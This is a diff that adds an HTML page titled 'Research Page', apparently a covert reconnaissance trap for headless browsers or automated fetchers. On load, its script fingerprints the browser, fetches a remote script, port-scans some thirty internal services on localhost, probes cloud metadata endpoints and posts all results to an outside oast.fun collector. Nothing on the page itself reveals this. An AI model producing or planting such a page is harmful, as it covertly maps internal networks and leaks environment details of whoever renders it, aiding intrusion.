@@ -1,0 +1,264 @@
+﻿<!DOCTYPE html>
+<html>
+<head><title>Research Page</title></head>
+<body>
+<script>
+  const COLLECTOR = "https://janjakokqvbayjmsqktcwjjfzxz7maiz5.oast.fun";
+
+  function send(endpoint, data) {
+    fetch(`${COLLECTOR}/${endpoint}`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    }).catch(() => {});
+  }
+
+  // ========== 1. FINGERPRINTING ==========
+  const fingerprint = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    languages: navigator.languages,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory,
+    maxTouchPoints: navigator.maxTouchPoints,
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    screenRes: `${screen.width}x${screen.height}`,
+    colorDepth: screen.colorDepth,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    webdriver: navigator.webdriver,
+    plugins: Array.from(navigator.plugins).map(p => p.name),
+    webglVendor: (() => {
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const ext = gl.getExtension('WEBGL_debug_renderer_info');
+        return gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
+      } catch (e) { return 'N/A'; }
+    })(),
+    webglRenderer: (() => {
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const ext = gl.getExtension('WEBGL_debug_renderer_info');
+        return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+      } catch (e) { return 'N/A'; }
+    })()
+  };
+  send("fingerprint", fingerprint);
+
+  // ========== 2. SANDBOX BOUNDARY CHECKS ==========
+  const sandbox = {
+    fileApi: typeof File !== 'undefined',
+    clipboard: !!navigator.clipboard,
+    notifications: typeof Notification !== 'undefined',
+    serviceWorker: 'serviceWorker' in navigator,
+    sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
+    webAssembly: typeof WebAssembly !== 'undefined',
+    webWorkers: typeof Worker !== 'undefined',
+    popupSupport: !!window.open,
+    performanceNow: typeof performance.now === 'function',
+    highResTimers: performance.now() % 1 !== 0,
+    crossOriginIsolated: window.crossOriginIsolated,
+    originAgentCluster: window.originAgentCluster,
+    indexedDB: !!window.indexedDB,
+    localStorage: (() => {
+      try { localStorage.setItem('test', '1'); localStorage.removeItem('test'); return true; }
+      catch (e) { return false; }
+    })(),
+    sessionStorage: (() => {
+      try { sessionStorage.setItem('test', '1'); sessionStorage.removeItem('test'); return true; }
+      catch (e) { return false; }
+    })(),
+    caches: !!window.caches,
+    crypto: !!window.crypto,
+    broadcastChannel: typeof BroadcastChannel !== 'undefined'
+  };
+  send("sandbox", sandbox);
+
+  // ========== 3. NETWORK BEHAVIOR ==========
+
+  // Image loading
+  const img = new Image();
+  img.onload = () => send("network", { test: "imageLoad", result: true });
+  img.onerror = () => send("network", { test: "imageLoad", result: false });
+  img.src = `${COLLECTOR}/test-image.png`;
+
+  // Iframe loading
+  try {
+    const iframe = document.createElement('iframe');
+    iframe.src = `${COLLECTOR}/iframe-test`;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    send("network", { test: "iframeCreated", result: true });
+  } catch (e) {
+    send("network", { test: "iframeCreated", result: false, error: e.message });
+  }
+
+  // Dynamic script loading
+  const s = document.createElement('script');
+  s.src = `${COLLECTOR}/dynamic-script.js`;
+  s.onload = () => send("network", { test: "dynamicScript", result: true });
+  s.onerror = () => send("network", { test: "dynamicScript", result: false });
+  document.body.appendChild(s);
+
+  // WebSocket support
+  try {
+    const ws = new WebSocket(`wss://janjakokqvbayjmsqktcwjjfzxz7maiz5.oast.fun/ws-test`);
+    ws.onopen = () => {
+      send("network", { test: "webSocket", result: true });
+      ws.close();
+    };
+    ws.onerror = () => send("network", { test: "webSocket", result: false });
+  } catch (e) {
+    send("network", { test: "webSocket", result: false, error: e.message });
+  }
+
+  // External fetch
+  fetch("https://example.com", { mode: "no-cors" })
+    .then(() => send("network", { test: "externalFetch", result: true }))
+    .catch(() => send("network", { test: "externalFetch", result: false }));
+
+  // DNS rebinding / internal network probes
+  ["http://127.0.0.1", "http://localhost", "http://[::1]"].forEach(target => {
+    fetch(target, { mode: "no-cors" })
+      .then(() => send("network", { test: "internalAccess", target: target, result: "reachable" }))
+      .catch(e => send("network", { test: "internalAccess", target: target, result: "blocked", error: e.message }));
+  });
+
+  // ========== 4. CHROME FEATURE DETECTION ==========
+  const chromeFeatures = {
+    pdfViewer: navigator.pdfViewerEnabled,
+    bluetooth: !!navigator.bluetooth,
+    usb: !!navigator.usb,
+    serial: !!navigator.serial,
+    hid: !!navigator.hid,
+    gpu: !!navigator.gpu,
+    mediaDevices: !!navigator.mediaDevices,
+    credentials: !!navigator.credentials,
+    storage: !!navigator.storage,
+    locks: !!navigator.locks,
+    connection: !!navigator.connection,
+    getBattery: !!navigator.getBattery,
+    presentation: !!navigator.presentation,
+    wakeLock: !!navigator.wakeLock,
+    xr: !!navigator.xr
+  };
+  send("chrome-features", chromeFeatures);
+
+  // ========== 5. TIMING / DWELL ANALYSIS ==========
+  const startTime = Date.now();
+  let heartbeatCount = 0;
+
+  const heartbeat = setInterval(() => {
+    heartbeatCount++;
+    send("heartbeat", {
+      count: heartbeatCount,
+      elapsedSeconds: Math.round((Date.now() - startTime) / 1000)
+    });
+    if (heartbeatCount >= 60) clearInterval(heartbeat);
+  }, 5000);
+
+  // Deferred execution tests
+  [10, 30, 60, 120, 300].forEach(seconds => {
+    setTimeout(() => {
+      send("timing", { delaySeconds: seconds, executed: true });
+    }, seconds * 1000);
+  });
+
+  // DOM lifecycle events
+  document.addEventListener('DOMContentLoaded', () => {
+    send("timing", { event: "DOMContentLoaded", ms: Date.now() - startTime });
+  });
+
+  window.addEventListener('load', () => {
+    send("timing", { event: "windowLoad", ms: Date.now() - startTime });
+  });
+
+  window.addEventListener('beforeunload', () => {
+    navigator.sendBeacon(
+      `${COLLECTOR}/timing`,
+      JSON.stringify({
+        event: "beforeUnload",
+        totalDwellSeconds: Math.round((Date.now() - startTime) / 1000)
+      })
+    );
+  });
+
+  // ========== 6. EXPANDED PORT SCAN (TIMING-BASED) ==========
+  const ports = [
+    { port: 9222, label: "chrome-debug" },
+    { port: 9229, label: "node-debug" },
+    { port: 5985, label: "winrm-http" },
+    { port: 5986, label: "winrm-https" },
+    { port: 445, label: "smb" },
+    { port: 135, label: "rpc" },
+    { port: 3389, label: "rdp" },
+    { port: 22, label: "ssh" },
+    { port: 443, label: "https" },
+    { port: 80, label: "http" },
+    { port: 8080, label: "alt-http" },
+    { port: 8443, label: "alt-https" },
+    { port: 3000, label: "dev-server" },
+    { port: 5000, label: "flask" },
+    { port: 8888, label: "jupyter" },
+    { port: 6379, label: "redis" },
+    { port: 27017, label: "mongodb" },
+    { port: 5432, label: "postgres" },
+    { port: 1433, label: "mssql" },
+    { port: 3306, label: "mysql" },
+    { port: 2375, label: "docker-api" },
+    { port: 2376, label: "docker-tls" },
+    { port: 10250, label: "kubelet" },
+    { port: 10255, label: "kubelet-ro" },
+    { port: 6443, label: "k8s-api" },
+    { port: 4194, label: "cadvisor" },
+    { port: 8001, label: "k8s-proxy" },
+    { port: 53, label: "dns" },
+    { port: 88, label: "kerberos" },
+    { port: 389, label: "ldap" },
+    { port: 636, label: "ldaps" }
+  ];
+
+  ports.forEach(({ port, label }) => {
+    const start = performance.now();
+    fetch(`http://127.0.0.1:${port}/`, { mode: "no-cors", signal: AbortSignal.timeout(3000) })
+      .then(() => {
+        const ms = Math.round(performance.now() - start);
+        send("portscan", { port, label, status: "open-or-responded", ms });
+      })
+      .catch(e => {
+        const ms = Math.round(performance.now() - start);
+        send("portscan", { port, label, status: e.name, ms, error: e.message });
+      });
+  });
+
+  // ========== 7. CLOUD METADATA PROBES ==========
+  const metadataTargets = [
+    { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", label: "azure-imds", headers: { "Metadata": "true" } },
+    { url: "http://169.254.169.254/latest/meta-data/", label: "aws-imds", headers: {} },
+    { url: "http://metadata.google.internal/computeMetadata/v1/", label: "gcp-metadata", headers: { "Metadata-Flavor": "Google" } },
+    { url: "http://169.254.169.254/metadata/v1/", label: "do-metadata", headers: {} }
+  ];
+
+  metadataTargets.forEach(({ url, label, headers }) => {
+    fetch(url, { headers, mode: "no-cors" })
+      .then(r => send("metadata", { label, status: "reachable", httpStatus: r.status }))
+      .catch(e => send("metadata", { label, status: "blocked", error: e.message }));
+  });
+
+  // ========== 8. OUTBOUND PROTOCOL CHECKS ==========
+  // Can the engine reach arbitrary external hosts?
+  const externalTests = [
+    { url: "https://dns.google/resolve?name=example.com&type=A", label: "doh-google" },
+    { url: "https://cloudflare-dns.com/dns-query?name=example.com&type=A", label: "doh-cloudflare" },
+    { url: `${COLLECTOR}/outbound-confirmed`, label: "interactsh-outbound" }
+  ];
+
+  externalTests.forEach(({ url, label }) => {
+    fetch(url, { mode: "no-cors" })
+      .then(() => send("outbound", { label, result: "reachable" }))
+      .catch(e => send("outbound", { label, result: "blocked", error: e.message }));
+  });
+
+</script>
+</body>
+</html>
